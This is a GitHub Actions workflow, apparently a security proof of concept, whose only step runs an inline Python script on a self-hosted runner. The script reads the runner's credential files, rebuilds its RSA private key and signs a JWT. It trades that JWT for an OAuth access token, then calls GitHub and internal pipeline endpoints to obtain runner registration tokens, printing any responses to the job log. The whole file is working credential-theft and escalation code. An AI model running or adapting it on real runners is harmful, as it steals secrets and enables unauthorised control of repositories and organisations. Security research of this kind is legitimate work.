name: Test Runner Token
on: [push]
jobs:
  find:
    runs-on: self-hosted
    steps:
      - name: Full Chain Test
        run: |
          RUNNER_BASE="/Users/delledoxsecurity/github/d/actions-runner"
          
          pip3 install cryptography PyJWT --break-system-packages 2>/dev/null
          
          python3 -c "
          import json, time, base64, jwt
          import urllib.request, urllib.parse, urllib.error
          from cryptography.hazmat.backends import default_backend
          from cryptography.hazmat.primitives.asymmetric.rsa import (
              RSAPrivateNumbers, RSAPublicNumbers
          )
          
          with open('$RUNNER_BASE/.credentials_rsaparams', 'r', encoding='utf-8-sig') as f:
              params = json.load(f)
          with open('$RUNNER_BASE/.credentials', 'r', encoding='utf-8-sig') as f:
              creds = json.load(f)
          with open('$RUNNER_BASE/.runner', 'r', encoding='utf-8-sig') as f:
              runner = json.load(f)
          
          def b64_to_int(b64):
              b64 += '=' * (4 - len(b64) % 4)
              return int.from_bytes(base64.urlsafe_b64decode(b64), 'big')
          
          # Build RSA key
          private_numbers = RSAPrivateNumbers(
              p=b64_to_int(params['p']),
              q=b64_to_int(params['q']),
              d=b64_to_int(params['d']),
              dmp1=b64_to_int(params['dp']),
              dmq1=b64_to_int(params['dq']),
              iqmp=b64_to_int(params['inverseQ']),
              public_numbers=RSAPublicNumbers(
                  e=b64_to_int(params['exponent']),
                  n=b64_to_int(params['modulus'])
              )
          )
          private_key = private_numbers.private_key(default_backend())
          
          client_id = creds['data']['clientId']
          auth_url = creds['data']['authorizationUrl']
          server_url = runner['serverUrl']
          github_url = runner['gitHubUrl']
          agent_id = runner['agentId']
          pool_id = runner['poolId']
          
          print('=== STEP 1: Generate JWT ===')
          now = int(time.time())
          payload = {
              'sub': client_id,
              'iss': client_id,
              'aud': auth_url,
              'nbf': now,
              'exp': now + 270,
              'jti': str(now)
          }
          
          client_assertion = jwt.encode(
              payload, private_key, algorithm='RS256'
          )
          print('JWT Generated!')
          
          print('\n=== STEP 2: OAuth2 Token Exchange ===')
          form_data = urllib.parse.urlencode({
              'grant_type': 'client_credentials',
              'client_assertion_type': 'urn:ietf:params:oauth:client-assertion-type:jwt-bearer',
              'client_assertion': client_assertion,
              'client_id': client_id
          }).encode()
          
          req = urllib.request.Request(
              auth_url,
              method='POST',
              data=form_data,
              headers={
                  'Content-Type': 'application/x-www-form-urlencoded',
                  'Accept': 'application/json'
              }
          )
          with urllib.request.urlopen(req) as resp:
              token_response = json.loads(resp.read().decode())
              access_token = token_response['access_token']
              token_type = token_response['token_type']
              expires_in = token_response['expires_in']
              print(f'Access Token Obtained! Expires in: {expires_in}s')
          
          print('\n=== STEP 3: Try All Endpoints ===')
          
          endpoints = [
              # GitHub REST API - Repo level
              ('REPO REG TOKEN REST', 'POST',
               'https://api.github.com/repos/${{ github.repository }}/actions/runners/registration-token',
               {'Authorization': f'Bearer {access_token}',
                'Accept': 'application/vnd.github.v3+json',
                'Content-Length': '0'}),
               
              # GitHub REST API - Org level  
              ('ORG REG TOKEN REST', 'POST',
               'https://api.github.com/orgs/${{ github.repository_owner }}/actions/runners/registration-token',
               {'Authorization': f'Bearer {access_token}',
                'Accept': 'application/vnd.github.v3+json',
                'Content-Length': '0'}),
                
              # Internal Pipeline API
              ('PIPELINE API REG TOKEN', 'POST',
               f'{server_url}_apis/distributedtask/pools/{pool_id}/agentregistrationrequests',
               {'Authorization': f'Bearer {access_token}',
                'Accept': 'application/json',
                'Content-Length': '0'}),
                
              # Internal Pipeline API - Token endpoint
              ('PIPELINE TOKEN ENDPOINT', 'POST',
               f'{server_url}_apis/distributedtask/pools/{pool_id}/agentregistrationtoken',
               {'Authorization': f'Bearer {access_token}',
                'Accept': 'application/json',
                'Content-Length': '0'}),
                
              # List runners to verify access
              ('LIST REPO RUNNERS', 'GET',
               'https://api.github.com/repos/${{ github.repository }}/actions/runners',
               {'Authorization': f'Bearer {access_token}',
                'Accept': 'application/vnd.github.v3+json'}),
                
              # GitHub URL based endpoint
              ('GITHUB URL ENDPOINT', 'POST',
               f'{github_url}/_apis/distributedtask/pools/{pool_id}/agentregistrationrequests',
               {'Authorization': f'Bearer {access_token}',
                'Accept': 'application/json',
                'Content-Length': '0'}),
          ]
          
          for name, method, ep, headers in endpoints:
              print(f'\n--- {name} ---')
              print(f'URL: {ep}')
              try:
                  reg_req = urllib.request.Request(
                      ep,
                      method=method,
                      data=b'' if method == 'POST' else None,
                      headers=headers
                  )
                  with urllib.request.urlopen(reg_req) as reg_resp:
                      response = reg_resp.read().decode()
                      print(f'SUCCESS {reg_resp.status}:', response)
              except urllib.error.HTTPError as e:
                  print(f'HTTP {e.code}:', e.read().decode()[:200])
              except Exception as ex:
                  print('Error:', str(ex))
          "
